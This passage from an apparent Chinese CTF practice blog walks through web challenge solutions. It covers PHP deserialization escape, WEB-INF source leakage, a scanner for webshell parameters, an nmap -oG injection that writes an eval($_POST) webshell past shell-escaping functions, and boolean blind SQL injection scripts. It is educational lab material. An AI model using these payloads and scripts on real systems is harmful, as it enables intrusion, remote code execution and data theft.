class="hljs-comment">#会对$_SESSION进行序列化，然后进行过滤，将违法字符替换为空</span><br><span class="hljs-comment">#最后对反序列化字符串进行反序列化，读取img属性所代表的文件</span><br></code></pre></td></tr></table></figure>
<ol start="4">
<li>通过phpinfo()获取文件名：</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1748242783312.png" srcset="/img/loading.gif" lazyload alt="1748242783312"></p>
<ol start="5">
<li>反序列化字符逃逸：</li>
</ol>
<p>目的：将黑名单字符替换为空，但反序列化时字符长度数值不变，我们可以通过该漏洞改变反序列化字符串的结构，利用<code>&#125;</code>舍弃后续加入的<code>$_SESSION['img'] = base64_encode('guest_img.png');</code></p>
<p>分析一个wp的典型例子：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs tex"><span class="hljs-comment">%payload</span><br><span class="hljs-built_in">_</span>SESSION[user]=flagflagflagflagflagflag<span class="hljs-built_in">&amp;</span><span class="hljs-built_in">_</span>SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;<br><br><span class="hljs-comment">%未过滤的反序列化字符串</span><br>a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;flagflagflagflagflagflag&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;<br><br><span class="hljs-comment">%过滤后</span><br>a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;<br></code></pre></td></tr></table></figure>
<p>原来的user的值变为选中部分，后续额外添加了两个属性img和dd，然后用}表示反序列化字符串的结束。</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1748244268410.png" srcset="/img/loading.gif" lazyload alt="1748244268410"></p>
<ol start="6">
<li>构造我们自己的payload：</li>
</ol>
<p>选给出必须的部分：img对应d0g3_f1ag.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;<br></code></pre></td></tr></table></figure>
<p>我们这里传入2个$_SESSION的属性值，加上题目后续自动添加的img，共有三个属性，第一个属性加入黑名单字符用来逃逸，第二个属性传入我们需要的img，最后一个属性用来闭合反序列化字符串。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#第二个第三个属性：(通过第二个属性的属性值传入)</span><br>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;&#125;  =&gt; 长度为<span class="hljs-number">56</span><br><span class="hljs-comment">#第一个属性的值长度要能吞入我们传入的第二个属性名和第二个属性值的长度,吞入的结构如下：</span><br><span class="hljs-string">&quot;;s:1:&quot;</span>c<span class="hljs-string">&quot;;s:56:   =&gt; 长度为15</span><br><span class="hljs-string">    </span><br><span class="hljs-string">#payload如下：</span><br><span class="hljs-string">_SESSION[user]=flagflagflagphp&amp;_SESSION[c]=;s:3:&quot;</span>img<span class="hljs-string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="hljs-string">&quot;;s:1:&quot;</span>a<span class="hljs-string">&quot;;s:1:&quot;</span>b<span class="hljs-string">&quot;;&#125;</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
<p>payload解释如下：</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1748247959561.png" srcset="/img/loading.gif" lazyload alt="1748247959561"></p>
<ol start="7">
<li>传入后提示：</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1748248084866.png" srcset="/img/loading.gif" lazyload alt="1748248084866"></p>
<p>重新构造：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#第二个第三个属性：(通过第二个属性的属性值传入)</span><br>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;L2QwZzNfZmxsbGxsbGFn&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;&#125;  =&gt; 长度仍为<span class="hljs-number">56</span>不变<br><br><span class="hljs-comment">#payload如下：</span><br><span class="hljs-comment">#d0g3_f111111ag =&gt;(base64) L2QwZzNfZmxsbGxsbGFn</span><br>_SESSION[user]=flagflagflagphp&amp;_SESSION[c]=;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;L2QwZzNfZmxsbGxsbGFn&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
<p>获得flag，这里需要额外注意通过extract()对function变量赋值。</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1748248284439.png" srcset="/img/loading.gif" lazyload alt="1748248284439"></p>
<h2 id="RoarCTF-2019-Easy-Java">[RoarCTF 2019]Easy Java</h2>
<p>漏洞：源码泄露（WEB-INF/web.xml泄露）</p>
<h3 id="理论知识">理论知识</h3>
<p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p>
<p>WEB-INF主要包含一下文件或目录：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs tex">/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。<br>/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中<br>/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件<br>/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。<br>/WEB-INF/database.properties：数据库配置文件<br></code></pre></td></tr></table></figure>
<p>漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接获取class文件，在通过反编译class文件，得到网站源码。</p>
<h3 id="解题步骤">解题步骤</h3>
<ol>
<li>根据提示，获取help.docx文件（转为POST才可下载）：</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1748333496877.png" srcset="/img/loading.gif" lazyload alt="1748333496877"></p>
<p>没什么用的一堆乱码。</p>
<ol start="2">
<li>尝试获取/WEB-INF/web.xml文件：</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1748333711823.png" srcset="/img/loading.gif" lazyload alt="1748333711823"></p>
<p>得到了与flag有关的flag路径：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex">/WEB-INF/classes/com/wm/ctf/FlagController.class<br></code></pre></td></tr></table></figure>
<ol start="3">
<li>获取class文件：</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1748333835708.png" srcset="/img/loading.gif" lazyload alt="1748333835708"></p>
<p>base64解码得到flag。</p>
<h2 id="强网杯-2019-高明的黑客">[强网杯 2019]高明的黑客</h2>
<ol>
<li>根据提示，下载源码，发现有很多个php文件，利用脚本寻找存在一句话木马漏洞的文件。``</li>
</ol>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tex"><span class="hljs-comment">%寻找条件：</span><br>先找到get或者post传参入口，然后传入内容写入echo &#x27;xxx&#x27;，在响应内容中如果找到xxx，<br>说明能够正常传入然后执行。<br></code></pre></td></tr></table></figure>
<ol start="2">
<li>根据上述规则编写脚本，多线程，同时发送多个get,post请求：</li>
</ol>
<p>将src部署在本地，在本地进行测试</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> time<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;开始时间：  &#x27;</span>+  time.asctime( time.localtime(time.time()) ))<br>s1=threading.Semaphore(<span class="hljs-number">30</span>)  							  			<span class="hljs-comment">#这儿设置最大的线程数</span><br>filePath = <span class="hljs-string">r&quot;xxx&quot;</span>      <span class="hljs-comment">#这里读取文件名</span><br>os.chdir(filePath)													<span class="hljs-comment">#改变当前的路径</span><br>requests.adapters.DEFAULT_RETRIES = <span class="hljs-number">5</span>								<span class="hljs-comment">#设置重连次数，防止线程数过高，断开连接</span><br>files = os.listdir(filePath)<br>session = requests.Session()<br>session.keep_alive = <span class="hljs-literal">False</span>											 <span class="hljs-comment"># 设置连接活跃状态为False</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_content</span>(<span class="hljs-params">file</span>):<br>    s1.acquire()												<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;trying   &#x27;</span>+file+ <span class="hljs-string">&#x27;     &#x27;</span>+ time.asctime( time.localtime(time.time()) ))<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:							<span class="hljs-comment">#打开php文件，提取所有的$_GET和$_POST的参数</span><br>            gets = <span class="hljs-built_in">list</span>(re.findall(<span class="hljs-string">&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))<br>            posts = <span class="hljs-built_in">list</span>(re.findall(<span class="hljs-string">&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))<br>    data = &#123;&#125;														<span class="hljs-comment">#所有的$_POST</span><br>    params = &#123;&#125;														<span class="hljs-comment">#所有的$_GET</span><br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> gets:<br>        params[m] = <span class="hljs-string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span><br>    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> posts:<br>        data[n] = <span class="hljs-string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span><br>    url = <span class="hljs-string">&#x27;http://localhost:8081/src/&#x27;</span>+file<br>    <span class="hljs-comment">#print(url)</span><br>    req = session.post(url, data=data, params=params)			<span class="hljs-comment">#一次性请求所有的GET和POST</span><br>    req.close()												<span class="hljs-comment"># 关闭请求  释放内存</span><br>    req.encoding = <span class="hljs-string">&#x27;utf-8&#x27;</span><br>    content = req.text<br>    <span class="hljs-comment">#print(content)</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;xxxxxx&quot;</span> <span class="hljs-keyword">in</span> content:									<span class="hljs-comment">#如果发现有可以利用的参数，继续筛选出具体的参数</span><br>        flag = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> gets:<br>            req = session.get(url+<span class="hljs-string">&#x27;?%s=&#x27;</span>%a+<span class="hljs-string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>)<br>            content = req.text<br>            req.close()												<span class="hljs-comment"># 关闭请求  释放内存</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;xxxxxx&quot;</span> <span class="hljs-keyword">in</span> content:<br>                flag = <span class="hljs-number">1</span><br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> flag != <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> posts:<br>                req = session.post(url, data=&#123;b:<span class="hljs-string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>&#125;)<br>                content = req.text<br>                req.close()												<span class="hljs-comment"># 关闭请求  释放内存</span><br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;xxxxxx&quot;</span> <span class="hljs-keyword">in</span> content:<br>                    <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> flag == <span class="hljs-number">1</span>:													<span class="hljs-comment">#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span><br>            param = a<br>        <span class="hljs-keyword">else</span>:<br>            param = b<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;找到了利用文件： &#x27;</span>+file+<span class="hljs-string">&quot;  and 找到了利用的参数：%s&quot;</span> %param)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;结束时间：  &#x27;</span> + time.asctime(time.localtime(time.time())))<br>    s1.release()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> files:															<span class="hljs-comment">#加入多线程</span><br>   t = threading.Thread(target=get_content, args=(i,))<br>   t.start()<br><br></code></pre></td></tr></table></figure>
<p>运行结果：</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1748337434968.png" srcset="/img/loading.gif" lazyload alt="1748337434968"></p>
<ol start="3">
<li>找到入口后传参即可：</li>
</ol>
<p>这里应属于命令执行漏洞，echo也属于系统命令，非eval代码执行漏洞（蚁剑尝试无法连接）、</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex">http://xxx/xk0SzyKwfzw.php?Efa5BVG=cat<span class="hljs-comment">%20/flag</span><br></code></pre></td></tr></table></figure>
<h2 id="网鼎杯-2020-朱雀组-Nmap">[网鼎杯 2020 朱雀组]Nmap</h2>
<ol>
<li>与上述题目的<code>Online Tool</code>类似，考察nmap的用法，利用<code>-oG</code>写入参数，并绕过escapeshellarg和escapeshellcmd函数。</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#payload如下：</span><br><span class="hljs-string">&#x27; &lt;?php eval($_POST[1])?&gt; -oG 1.php &#x27;</span><br><span class="hljs-comment">#escapeshellarg:</span><br><span class="hljs-string">&#x27;&#x27;</span>\<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>])<span class="hljs-meta">?&gt;</span> -oG <span class="hljs-number">1</span>.php <span class="hljs-string">&#x27;\&#x27;&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">#escapeshellcmd:</span><br><span class="hljs-string">&#x27;</span><span class="hljs-string">&#x27;\\&#x27;</span><span class="hljs-string">&#x27; &lt;?php eval($_POST[1])?&gt; -oG 1.php &#x27;</span>\\<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure>
<ol start="2">
<li>这里php被过滤，标签替换为短标签，文件后缀改为phtml：</li>
</ol>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex">&#x27; &lt;?= eval(<span class="hljs-built_in">$</span><span class="hljs-built_in">_</span>POST[1])?&gt; -oG 1.phtml &#x27;<br></code></pre></td></tr></table></figure>
<p>最后蚁剑连接即可。</p>
<ol start="3">
<li>另一种解法，在nmap的方法中，可以利用<code>-iL</code>从文件中读取目标主机列表（这里可实现任意文件读取），利用<code>-o</code>将结果存在指定文件中。</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#payload如下：（扫描flag文件，然后将结果存放在文件1中）</span><br><span class="hljs-string">&#x27; -iL /flag -o 1 &#x27;</span><br><span class="hljs-comment">#escapeshellarg:</span><br><span class="hljs-string">&#x27;&#x27;</span>\<span class="hljs-string">&#x27;&#x27;</span> -iL /flag -o <span class="hljs-number">1</span> <span class="hljs-string">&#x27;\&#x27;&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">#escapeshellcmd:</span><br><span class="hljs-string">&#x27;</span><span class="hljs-string">&#x27;\\&#x27;</span><span class="hljs-string">&#x27; -iL /flag -o 1 &#x27;</span>\\<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure>
<ol start="4">
<li>然后访问url/1，可以获取flag:</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1748417145030.png" srcset="/img/loading.gif" lazyload alt="1748417145030"></p>
<h1>i春秋</h1>
<p>newstarctf，参考<a target="_blank" rel="noopener" href="https://newstar.wiki/">https://newstar.wiki/</a></p>
<h2 id="blindsql1">blindsql1</h2>
<p>思路：</p>
<p>题目提示为bool盲注，通过首页表中的人名<strong>拼接and+判断语句</strong>，看是否能够正确回显结果进行爆破。</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1748441268819.png" srcset="/img/loading.gif" lazyload alt="1748441268819"></p>
<ol>
<li>根据查询尝试，发包的方式为get，键名为<code>student_name</code>。</li>
<li>内容过滤：</li>
</ol>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs tex"><span class="hljs-comment">%</span><br>union  使用布尔盲注<br><span class="hljs-comment">%</span><br>空格 使用()代替<br><span class="hljs-comment">%</span><br>=   使用like替代<br><span class="hljs-comment">%</span><br>ascii()函数 使用ord()代替<br>substr()函数 使用mid()代替<br></code></pre></td></tr></table></figure>
<ol start="3">
<li>爆破脚本书写：</li>
</ol>
<ul>
<li>爆表：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://eci-2ze30rs2hbzotuksip0f.cloudeci1.ichunqiu.com/&quot;</span><br>flag = <span class="hljs-string">&quot;&quot;</span><br><br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    i = i+<span class="hljs-number">1</span><br>    left = <span class="hljs-number">32</span><br>    right = <span class="hljs-number">127</span><br>    <span class="hljs-keyword">while</span> right &gt; left:<br>        mid = (left + right) // <span class="hljs-number">2</span><br>        sql = <span class="hljs-string">f&#x27;if(ord(mid((select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(database()))),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>,1,0)&#x27;</span><br>        payload = <span class="hljs-string">f&#x27;Alice\&#x27;and(<span class="hljs-subst">&#123;sql&#125;</span>)#&#x27;</span><br>        data = &#123;<span class="hljs-string">&#x27;student_name&#x27;</span>:payload&#125;<br>        res = requests.get(url=url,params=data)   <span class="hljs-comment">#注意get的传参方式</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Alice&quot;</span> <span class="hljs-keyword">in</span> res.text:<br>            left = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            right = mid<br>        <br>    <span class="hljs-keyword">if</span> left == <span class="hljs-number">32</span>:    <span class="hljs-comment">#空格表示结束</span><br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        flag += <span class="hljs-built_in">chr</span>(left)<br>        <span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>
<p>结果如图：</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1748443645630.png" srcset="/img/loading.gif" lazyload alt="1748443645630"></p>
<ul>
<li>爆列：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://eci-2ze30rs2hbzotuksip0f.cloudeci1.ichunqiu.com/&quot;</span><br>flag = <span class="hljs-string">&quot;&quot;</span><br><br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    i = i+<span class="hljs-number">1</span><br>    left = <span class="hljs-number">32</span><br>    right = <span class="hljs-number">127</span><br>    <span class="hljs-keyword">while</span> right &gt; left:<br>        mid = (left + right) // <span class="hljs-number">2</span><br>        sql = <span class="hljs-string">f&#x27;if(ord(mid((select(group_concat(column_name))from(information_schema.columns)where((table_name)like(\&#x27;secrets\&#x27;))),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>,1,0)&#x27;</span><br>        payload = <span class="hljs-string">f&#x27;Alice\&#x27;and(<span class="hljs-subst">&#123;sql&#125;</span>)#&#x27;</span><br>        data = &#123;<span class="hljs-string">&#x27;student_name&#x27;</span>:payload&#125;<br>        res = requests.get(url=url,params=data)  <span class="hljs-comment">#get传参</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Alice&quot;</span> <span class="hljs-keyword">in</span> res.text:<br>            left = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            right = mid<br>        <br>    <span class="hljs-keyword">if</span> left == <span class="hljs-number">32</span>:    <span class="hljs-comment">#空格表示结束</span><br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        flag += <span class="hljs-built_in">chr</span>(left)<br>        <span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>
<p>运行结果：</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1748443861210.png" srcset="/img/loading.gif" lazyload alt="1748443861210"></p>
<ul>
<li>爆数据：获得flag</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://eci-2ze30rs2hbzotuksip0f.cloudeci1.ichunqiu.com/&quot;</span><br>flag = <span class="hljs-string">&quot;&quot;</span><br><br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    i = i+<span class="hljs-number">1</span><br>    left = <span class="hljs-number">32</span><br>    right = <span class="hljs-number">127</span><br>    <span class="hljs-keyword">while</span> right &gt; left:<br>        mid = (left + right) // <span class="hljs-number">2</span><br>        sql = <span class="hljs-string">f&#x27;if(ord(mid((select(group_concat(secret_value))from(secrets)where(secret_value)like(\&#x27;flag%\&#x27;)),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>,1,0)&#x27;</span><br>        payload = <span class="hljs-string">f&#x27;Alice\&#x27;and(<span class="hljs-subst">&#123;sql&#125;</span>)#&#x27;</span><br>        data = &#123;<span class="hljs-string">&#x27;student_name&#x27;</span>:payload&#125;<br>        res = requests.get(url=url,params=data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Alice&quot;</span> <span class="hljs-keyword">in</span> res.text:<br>            left = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            right = mid<br>        <br>    <span class="hljs-keyword">if</span> left == <span class="hljs-number">32</span>:    <span class="hljs-comment">#空格表示结束</span><br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        flag += <span class="hljs-built_in">chr</span>(left)<br>        <span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>
<p>运行结果：</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1748444466078.png" srcset="/img/loading.gif" lazyload alt="1748444466078"></p>
<ol start="4">
<li>补充一个遗忘的知识点：</li>
</ol>
<p>数据库通配符，与like混合使用</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1748444739932.png" srcset="/img/loading.gif" lazyload alt="1748444739932"></p>
<h2 id="臭皮踩踩背">臭皮踩踩背</h2>
<ol>
<li>题目代码如下：</li>
</ol>
